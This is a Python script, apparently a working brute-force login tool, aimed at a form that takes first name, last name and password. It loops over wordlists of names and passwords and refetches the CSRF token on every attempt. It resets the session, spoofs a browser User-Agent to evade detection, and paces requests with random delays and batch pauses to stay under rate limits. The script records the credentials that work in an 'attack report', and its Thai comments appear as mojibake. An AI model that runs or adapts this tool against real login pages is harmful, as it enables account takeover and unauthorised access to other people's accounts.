import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import os
import time
import random
from datetime import datetime

# 1. ‡πÇ‡∏´‡∏•‡∏î environment variables
load_dotenv()

# 2. ‡∏Å‡∏≥‡∏´‡∏ô‡∏î URL ‡∏à‡∏≤‡∏Å .env ‡∏´‡∏£‡∏∑‡∏≠‡πÉ‡∏ä‡πâ‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô
base_url = os.getenv('BASE_URL', 'http://localhost:5000')  # ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô
login_url = f"{base_url}{os.getenv('LOGIN_URL', '/login')}"  # ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô

print(f"üåê ‡πÉ‡∏ä‡πâ URL: {base_url}")
print(f"üîó Login URL: {login_url}")
print("-" * 50)

# 3. ‡πÄ‡∏£‡∏¥‡πà‡∏° session ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö cookies
session = requests.Session()

# ‡πÉ‡∏ä‡πâ User-Agent ‡πÅ‡∏ö‡∏ö‡∏á‡πà‡∏≤‡∏¢‡πÜ ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
})

# 4. ‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô‡∏≥ CSRF Token
try:
    response = session.get(login_url)
    print(f"üìä Status Code: {response.status_code}")
    print(f"üìç Final URL: {response.url}")
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 5. ‡∏î‡∏∂‡∏á CSRF Token ‡∏à‡∏≤‡∏Å input hidden
    csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
    if not csrf_input:
        print("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö CSRF Token ‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ login")
        print("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö HTML structure...")
        
        # ‡πÅ‡∏™‡∏î‡∏á input fields ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÄ‡∏û‡∏∑‡πà‡∏≠ debug
        all_inputs = soup.find_all('input')
        print(f"‡∏û‡∏ö input fields ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô: {len(all_inputs)}")
        for i, input_field in enumerate(all_inputs, 1):
            input_name = input_field.get('name', '‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏ä‡∏∑‡πà‡∏≠')
            input_type = input_field.get('type', 'text')
            print(f"   {i}. Name: {input_name}, Type: {input_type}")

        
        exit()
        
    csrf_token = csrf_input['value']
    print(f"üîë CSRF Token ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ: {csrf_token}")
    
except Exception as e:
    print(f"‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login: {e}")
    print("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö response...")
    
    if 'response' in locals():
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text (first 500 chars): {response.text[:500]}")
    
    exit()

# 6. ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
def read_file_lines(filename):
    """‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏•‡∏∞‡∏Ñ‡∏∑‡∏ô‡∏Ñ‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå {filename}")
        return []

# ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
fnames = read_file_lines('fname.txt')
lnames = read_file_lines('lname.txt')
passwords = read_file_lines('password.txt')

if not fnames or not lnames or not passwords:
    print("‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏î‡πâ")
    exit()

print(f"üìä ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡πÇ‡∏´‡∏•‡∏î‡πÑ‡∏î‡πâ:")
print(f"   - ‡∏ä‡∏∑‡πà‡∏≠: {len(fnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print(f"   - ‡∏ô‡∏≤‡∏°‡∏™‡∏Å‡∏∏‡∏•: {len(lnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£") 
print(f"   - ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô: {len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print(f"   - ‡∏£‡∏ß‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print("-" * 50)

# 7. ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
attempt_count = 0
success_count = 0
successful_logins = []  # ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
start_time = datetime.now()  # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô

# ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏Å‡∏≤‡∏£‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤
MIN_DELAY = 1.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡πà‡∏≥ 1 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
MAX_DELAY = 5.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
BATCH_SIZE = 10   # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö 10 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏•‡πâ‡∏ß‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏ô‡∏≤‡∏ô
BATCH_DELAY = 20.0  # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å 20 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö 10 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á
CSRF_REFRESH_INTERVAL = 1  # ‡∏î‡∏∂‡∏á CSRF token ‡πÉ‡∏´‡∏°‡πà‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á

# ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ó‡∏µ‡πà password ‡∏Å‡πà‡∏≠‡∏ô (outer loop)
for password in passwords:
    print(f"\nüîê ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô: {password}")
    print("=" * 40)
    
    for i in range(len(fnames)):
        if i < len(lnames):
            fname = fnames[i]
            lname = lnames[i]
            attempt_count += 1

            # Reset session ‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏ß‡∏ô‡∏•‡∏π‡∏õ
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })

            # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏´‡∏•‡∏≤‡∏¢‡∏Ñ‡∏£‡∏±‡πâ‡∏á
            if attempt_count % BATCH_SIZE == 0:
                print(f"üõë ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö {BATCH_SIZE} ‡∏Ñ‡∏£‡∏±‡πâ‡∏á...")
                print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {BATCH_DELAY} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
                time.sleep(BATCH_DELAY)
                print("‚ñ∂Ô∏è ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡πà‡∏≠...")
                print("-" * 30)

            print(f"üîç ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà {attempt_count}: {fname} {lname} / {password}")

            # ‡∏î‡∏∂‡∏á CSRF Token ‡πÉ‡∏´‡∏°‡πà
            print(f"üîÑ ‡∏î‡∏∂‡∏á CSRF Token ‡πÉ‡∏´‡∏°‡πà (‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà {attempt_count})...")
            try:
                login_page_response = session.get(login_url)
                print(f"URL ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ: {login_page_response.url}")
                if not login_page_response.url.endswith('/login'):
                    print("‚ùå ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà‡∏´‡∏ô‡πâ‡∏≤ /login ‡∏≠‡∏≤‡∏à‡πÇ‡∏î‡∏ô redirect")
                    continue
                login_soup = BeautifulSoup(login_page_response.text, 'html.parser')
                csrf_input = login_soup.find('input', {'name': '__RequestVerificationToken'})
                if not csrf_input:
                    print("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö CSRF Token ‡πÉ‡∏´‡∏°‡πà")
                    continue
                csrf_token = csrf_input['value']
                print(f"üîë CSRF Token ‡πÉ‡∏´‡∏°‡πà: {csrf_token[:20]}...")
            except Exception as e:
                print(f"‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á CSRF Token ‡πÉ‡∏´‡∏°‡πà‡πÑ‡∏î‡πâ: {e}")
                continue

            # ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö POST
            login_data = {
                '__RequestVerificationToken': csrf_token,
                'FName': fname,
                'LName': lname,
                'Password': password
            }

            # ‡∏™‡πà‡∏á POST ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ü‡∏≠‡∏£‡πå‡∏° login
            try:
                post_response = session.post(login_url, data=login_data)
                print(f"üì° POST Response Status: {post_response.status_code}")
                print(f"üìç POST Response URL: {post_response.url}")
                print(f"üì° POST Data: {login_data}")

                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö response headers
                if 'Set-Cookie' in post_response.headers:
                    print("üç™ ‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö cookies ‡πÉ‡∏´‡∏°‡πà")

                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
                response_text = post_response.text.strip()
                print(f"üìÑ Response Text: {response_text[:200]}...")

                if response_text.lower() == "true":
                    print("‚úÖ Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à (‡∏£‡∏∞‡∏ö‡∏ö‡∏ï‡∏≠‡∏ö true)")
                    success_count += 1
                    successful_logins.append({
                        'attempt': attempt_count,
                        'fname': fname,
                        'lname': lname,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                else:
                    print("‚ùå Login ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß (‡∏£‡∏∞‡∏ö‡∏ö‡∏ï‡∏≠‡∏ö false)")

            except Exception as e:
                print(f"‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á POST: {e}")
                try:
                    with open(f'error_response_{attempt_count}.html', 'w', encoding='utf-8') as f:
                        f.write(post_response.text if 'post_response' in locals() else str(e))
                    print(f"üíæ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å error response ‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå error_response_{attempt_count}.html")
                except:
                    pass

            # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ server ‡∏£‡∏±‡∏ö‡∏†‡∏≤‡∏£‡∏∞‡∏°‡∏≤‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ
            delay = random.uniform(MIN_DELAY, MAX_DELAY)
            print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {delay:.1f} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
            time.sleep(delay)
            print("-" * 30)

# 8. ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
end_time = datetime.now()
duration = end_time - start_time

print("\n" + "=" * 50)
print("üìà ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö:")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {attempt_count}")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {success_count}")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {attempt_count - success_count}")
print(f"   - ‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"   - ‡πÄ‡∏ß‡∏•‡∏≤‡∏™‡∏¥‡πâ‡∏ô‡∏™‡∏∏‡∏î: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"   - ‡∏£‡∏∞‡∏¢‡∏∞‡πÄ‡∏ß‡∏•‡∏≤‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ: {duration}")
print("=" * 50)
print("üéØ ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô!")

# 9. ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå brute_force_results.txt ‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö log 
def save_results_to_log():
    """‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå brute_force_results.txt ‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö log"""
    
    # ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô ZeroDivisionError
    success_rate = (success_count/attempt_count*100) if attempt_count > 0 else 0
    avg_time = (duration.total_seconds()/attempt_count) if attempt_count > 0 else 0
    
    # ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤ log
    log_content = f"""
================================================================================
BRUTE FORCE LOGIN ATTACK REPORT
================================================================================

EXECUTION DETAILS:
    Target URL: {base_url}
    Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}
    End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}
    Duration: {duration}
    Total Attempts: {attempt_count}
    Successful Logins: {success_count}
    Failed Attempts: {attempt_count - success_count}
    Success Rate: {success_rate:.2f}%

ATTACK PARAMETERS:
    FName Records: {len(fnames)}
    LName Records: {len(lnames)}
    Password Records: {len(passwords)}
    Test Combinations: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)}
    Delay Range: {MIN_DELAY}-{MAX_DELAY} seconds
    Batch Size: {BATCH_SIZE}
    Batch Delay: {BATCH_DELAY} seconds

SUCCESSFUL LOGINS:
"""
    
    if successful_logins:
        log_content += """    +----+----------------+----------------------+------------+---------------------+
    | ID | First Name     | Last Name            | Password   | Timestamp           |
    +----+----------------+----------------------+------------+---------------------+
"""
        for i, login in enumerate(successful_logins, 1):
            fname_padded = f"{login['fname']:<14}"
            lname_padded = f"{login['lname']:<20}"
            password_padded = f"{login['password']:<10}"
            log_content += f"    | {i:2d} | {fname_padded} | {lname_padded} | {password_padded} | {login['timestamp']} |\n"
        log_content += "    +----+----------------+----------------------+------------+---------------------+\n"
    else:
        log_content += "    NO SUCCESSFUL LOGINS FOUND\n"
    
    log_content += f"""
ATTACK STATISTICS:
    +------------------------+----------+
    | Metric                 | Value    |
    +------------------------+----------+
    | Total Attempts         | {attempt_count:8d} |
    | Successful Logins      | {success_count:8d} |
    | Failed Attempts        | {attempt_count - success_count:8d} |
    | Success Rate           | {success_rate:7.2f}% |
    | Average Time per Test  | {avg_time:7.2f}s |
    +------------------------+----------+

SECURITY ASSESSMENT:
    Risk Level: {'HIGH' if success_count > 0 else 'LOW'}
    Vulnerable Accounts: {success_count}
    Attack Effectiveness: {success_rate:.2f}%
    Recommendations: {'Immediate password policy review required' if success_count > 0 else 'Current security measures appear effective'}

================================================================================
REPORT GENERATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
================================================================================

"""
    
    # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå (append mode)
    try:
        with open('brute_force_results.txt', 'a', encoding='utf-8') as f:
            f.write(log_content)
        print("üíæ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå brute_force_results.txt ‡πÅ‡∏•‡πâ‡∏ß")
    except Exception as e:
        print(f"‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÑ‡∏î‡πâ: {e}")

# ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
save_results_to_log()